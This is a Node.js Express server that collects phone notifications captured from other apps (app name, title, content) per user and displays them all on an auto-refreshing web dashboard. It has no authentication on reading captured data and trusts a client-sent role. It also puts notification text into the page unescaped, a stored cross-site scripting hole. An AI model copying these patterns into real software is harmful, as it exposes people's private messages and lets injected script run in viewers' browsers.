const express = require('express');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

const notifications = []; // in memory; swap for a real database later
const logins = []; // in memory; records of who logged in and when

// ---------------------------------------------------------------------------
// LOGIN - the app calls this whenever a normal user logs in
// ---------------------------------------------------------------------------
app.post('/login', (req, res) => {
  const { userId, role } = req.body;

  if (!userId) {
    return res.status(400).json({ ok: false, error: 'userId is required' });
  }

  const entry = { userId, role: role || 'user', time: new Date() };
  logins.unshift(entry);
  console.log('Login recorded:', entry);

  res.status(201).json({ ok: true });
});

app.get('/login', (req, res) => {
  res.json(logins);
});

// ---------------------------------------------------------------------------
// NOTIFICATIONS - the app POSTs each captured notification here, tagged
// with the userId of whoever is logged in on that device
// ---------------------------------------------------------------------------
app.post('/notifications', (req, res) => {
  const { userId, packageName, title, content } = req.body;

  if (!userId || !packageName) {
    return res
      .status(400)
      .json({ ok: false, error: 'userId and packageName are required' });
  }

  const item = {
    userId,
    packageName,
    title: title || null,
    content: content || null,
    receivedAt: new Date(),
  };

  notifications.unshift(item);
  console.log('Received notification:', item);

  res.status(201).json({ ok: true });
});

// GET /notifications            -> everything (super admin)
// GET /notifications?userId=xyz -> only that user's notifications
app.get('/notifications', (req, res) => {
  const { userId } = req.query;
  if (userId) {
    return res.json(notifications.filter((n) => n.userId === userId));
  }
  res.json(notifications);
});

// ---------------------------------------------------------------------------
// Human-readable dashboard (open in any browser)
// ---------------------------------------------------------------------------
app.get('/', (req, res) => {
  const rows = notifications
    .map(
      (n) => `
        <tr>
          <td>${new Date(n.receivedAt).toLocaleString()}</td>
          <td>${n.userId}</td>
          <td>${n.packageName}</td>
          <td>${n.title || ''}</td>
          <td>${n.content || ''}</td>
        </tr>`
    )
    .join('');

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="utf-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1" />
      <meta http-equiv="refresh" content="5" />
      <title>Notifications</title>
      <style>
        body { font-family: sans-serif; margin: 24px; background: #f5f5f5; }
        h1 { color: #333; }
        table { width: 100%; border-collapse: collapse; background: white; }
        th, td { padding: 8px 12px; border-bottom: 1px solid #ddd; text-align: left; font-size: 14px; }
        th { background: #4f46e5; color: white; }
        tr:hover { background: #f0f0ff; }
      </style>
    </head>
    <body>
      <h1>Captured Notifications (${notifications.length})</h1>
      <p>Auto-refreshes every 5 seconds.</p>
      <table>
        <tr><th>Time</th><th>User</th><th>App</th><th>Title</th><th>Content</th></tr>
        ${rows || '<tr><td colspan="5">No notifications yet</td></tr>'}
      </table>
    </body>
    </html>
  `);
});

// Cloud hosts (Render, Railway, Fly.io, etc.) assign the port via
// process.env.PORT; 3000 is only used for local testing.
const PORT = process.env.PORT || 3000;
// 0.0.0.0 so phones on the same Wi-Fi (or the host's network) can reach it
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on port ${PORT}`);
});